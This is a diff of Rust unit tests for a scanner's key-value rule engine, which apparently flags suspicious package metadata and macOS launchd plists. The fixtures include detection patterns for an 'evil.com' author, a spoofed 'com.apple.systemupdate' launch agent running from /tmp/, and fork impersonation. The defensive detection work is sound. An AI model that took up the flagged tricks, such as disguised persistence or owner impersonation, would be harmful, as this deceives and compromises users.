         // Should not panic, just return no match
         assert!(evaluate_kv_test(&cond, bad, path).is_none());
     }
@@ -4116,7 +4190,8 @@ Author: attacker@evil.com
         let path = Path::new("PKG-INFO");
 
         // Test name match
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "name".to_string(),
             exact: Some("malicious-package".to_string()),
             substr: None,
@@ -4127,11 +4202,12 @@ Author: attacker@evil.com
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());
 
         // Test version
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "version".to_string(),
             exact: Some("1.0.0".to_string()),
             substr: None,
@@ -4142,11 +4218,12 @@ Author: attacker@evil.com
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());
 
         // Test author contains suspicious domain
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "author".to_string(),
             exact: None,
             substr: Some("evil.com".to_string()),
@@ -4157,11 +4234,12 @@ Author: attacker@evil.com
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());
 
         // Test existence
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "summary".to_string(),
             exact: None,
             substr: None,
@@ -4172,11 +4250,12 @@ Author: attacker@evil.com
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());
 
         // Test non-existent
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "license".to_string(),
             exact: None,
             substr: None,
@@ -4187,7 +4266,7 @@ Author: attacker@evil.com
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, pkginfo, path).is_none());
     }
 
@@ -4203,7 +4282,8 @@ Classifier: Programming Language :: Python :: 3
         let path = Path::new("PKG-INFO");
 
         // Multiple Classifier values become an array
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "classifier".to_string(),
             exact: None,
             substr: Some("MIT License".to_string()),
@@ -4214,11 +4294,12 @@ Classifier: Programming Language :: Python :: 3
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());
 
         // Check Python classifier
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "classifier".to_string(),
             exact: None,
             substr: Some("Python".to_string()),
@@ -4229,7 +4310,7 @@ Classifier: Programming Language :: Python :: 3
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());
     }
 
@@ -4245,7 +4326,8 @@ Version: 1.0.0
 
         let path = Path::new("PKG-INFO");
 
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "description".to_string(),
             exact: None,
             substr: Some("multi-line".to_string()),
@@ -4256,7 +4338,7 @@ Version: 1.0.0
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());
     }
 
@@ -4270,7 +4352,8 @@ Author-Email: test@example.com
         let path = Path::new("PKG-INFO");
 
         // Keys are normalized to lowercase
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "author-email".to_string(),
             exact: None,
             substr: Some("example.com".to_string()),
@@ -4281,7 +4364,7 @@ Author-Email: test@example.com
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, pkginfo, path).is_some());
     }
 
@@ -4335,7 +4418,8 @@ Author-Email: test@example.com
         let path = Path::new("Info.plist");
 
         // Test exact match
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "CFBundleIdentifier".to_string(),
             exact: Some("com.example.app".to_string()),
             substr: None,
@@ -4346,11 +4430,12 @@ Author-Email: test@example.com
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, plist, path).is_some());
 
         // Test match in array
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "Permissions".to_string(),
             exact: Some("camera".to_string()),
             substr: None,
@@ -4361,11 +4446,12 @@ Author-Email: test@example.com
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, plist, path).is_some());
 
         // Test non-matching
-        let cond = Condition::Kv {
+        let cond = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "CFBundleIdentifier".to_string(),
             exact: Some("com.other.app".to_string()),
             substr: None,
@@ -4376,7 +4462,7 @@ Author-Email: test@example.com
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond, plist, path).is_none());
     }
 
@@ -4397,7 +4483,8 @@ Author-Email: test@example.com
         let path = Path::new("com.apple.systemupdate.plist");
 
         // Test Label starts with com.apple.
-        let cond_label = Condition::Kv {
+        let cond_label = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "Label".to_string(),
             exact: None,
             substr: None,
@@ -4408,11 +4495,12 @@ Author-Email: test@example.com
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond_label, plist, path).is_some());
 
         // Test Program is in /tmp/
-        let cond_program = Condition::Kv {
+        let cond_program = Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: "Program".to_string(),
             exact: None,
             substr: None,
@@ -4423,7 +4511,7 @@ Author-Email: test@example.com
             exists: None,
             size_min: None,
             size_max: None,
-        };
+        });
         assert!(evaluate_kv_test(&cond_program, plist, path).is_some());
     }
 
@@ -4517,7 +4605,8 @@ Author-Email: test@example.com
     }
 
     fn kv_eq(path: &str, eq: &str) -> Condition {
-        Condition::Kv {
+        Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: path.to_string(),
             exact: None,
             substr: None,
@@ -4528,11 +4617,12 @@ Author-Email: test@example.com
             exists: None,
             size_min: None,
             size_max: None,
-        }
+        })
     }
 
     fn kv_ne(path: &str, ne: &str) -> Condition {
-        Condition::Kv {
+        Condition::Kv(KvQuery {
+            match_mode: Default::default(),
             path: path.to_string(),
             exact: None,
             substr: None,
@@ -4543,7 +4633,7 @@ Author-Email: test@example.com
             exists: None,
             size_min: None,
             size_max: None,
-        }
+        })
     }
 
     #[test]
@@ -4620,14 +4710,57 @@ Author-Email: test@example.com
         assert!(evaluate_kv(&kv_ne("missing", "x"), &ctx).is_none());
     }
 
+    fn kv_ne_q(path: &str, ne: &str, match_mode: ArrayQuantifier) -> Condition {
+        Condition::Kv(KvQuery {
+            path: path.to_string(),
+            ne: Some(ne.to_string()),
+            match_mode,
+            ..Default::default()
+        })
+    }
+
     #[test]
-    fn eq_rejects_container_values() {
-        // Comparing scalar to array is not defined — return no match.
-        let ctx = ctx_with_values(json!({
-            "scalar": "foo",
-            "container": ["foo"],
-        }));
-        assert!(evaluate_kv(&kv_eq("scalar", "container"), &ctx).is_none());
+    fn eq_matches_any_array_element() {
+        // Scalar vs array: existential by default — fires if SOME element matches.
+        let ctx = ctx_with_values(json!({ "scalar": "foo", "arr": ["bar", "foo"] }));
+        assert!(evaluate_kv(&kv_eq("scalar", "arr"), &ctx).is_some());
+    }
+
+    #[test]
+    fn eq_silent_when_no_array_element_matches() {
+        let ctx = ctx_with_values(json!({ "scalar": "foo", "arr": ["bar", "baz"] }));
+        assert!(evaluate_kv(&kv_eq("scalar", "arr"), &ctx).is_none());
+    }
+
+    #[test]
+    fn eq_rejects_object_values() {
+        // A non-array container (object) has no scalar projection → no match.
+        let ctx = ctx_with_values(json!({ "scalar": "foo", "obj": {"k": "foo"} }));
+        assert!(evaluate_kv(&kv_eq("scalar", "obj"), &ctx).is_none());
+    }
+
+    #[test]
+    fn ne_any_fires_when_an_array_element_differs() {
+        // The fork-impersonation shape: declared owner vs source owners — `ne`
+        // with the default `any` fires because at least one source differs.
+        let ctx = ctx_with_values(json!({ "owner": "foo", "src": ["foo", "attacker"] }));
+        assert!(evaluate_kv(&kv_ne("owner", "src"), &ctx).is_some());
+    }
+
+    #[test]
+    fn ne_any_silent_when_all_array_elements_equal() {
+        let ctx = ctx_with_values(json!({ "owner": "foo", "src": ["foo", "foo"] }));
+        assert!(evaluate_kv(&kv_ne("owner", "src"), &ctx).is_none());
+    }
+
+    #[test]
+    fn ne_all_requires_every_element_to_differ() {
+        // `all`: the relation must hold for every right value. A matching
+        // element means "not all differ" → no match; a disjoint set fires.
+        let mixed = ctx_with_values(json!({ "owner": "foo", "src": ["foo", "attacker"] }));
+        assert!(evaluate_kv(&kv_ne_q("owner", "src", ArrayQuantifier::All), &mixed).is_none());
+        let disjoint = ctx_with_values(json!({ "owner": "foo", "src": ["a", "b"] }));
+        assert!(evaluate_kv(&kv_ne_q("owner", "src", ArrayQuantifier::All), &disjoint).is_some());
     }
 
     /// Cross-file resolution: a sibling FileAnalysis with its own
